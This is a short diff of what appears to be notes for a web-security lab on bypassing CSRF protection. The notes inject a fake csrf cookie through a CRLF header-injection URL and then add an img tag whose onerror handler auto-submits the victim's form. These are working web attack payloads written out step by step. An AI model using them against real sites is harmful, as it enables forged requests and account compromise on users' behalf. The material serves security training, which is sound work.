@@ -457,10 +457,11 @@ Check The Respotion header, here reflected in the Set-Cookie header, like this
  
  Create a URL that uses this vulnerability to inject a fake csrf cookie into the victim's browser: 
  
-     /?search=test%0d%0aSet-Cookie:%20csrf=hacked
+    /?search=test%0d%0aSet-Cookie:%20csrf=hacked
    
-   
-   
+ Remove the script block, and instead add the following code to inject the cookie and submit the form:
+ 
+   <img src="$cookie-injection-url" onerror="document.forms[0].submit();"/>
    
    
    
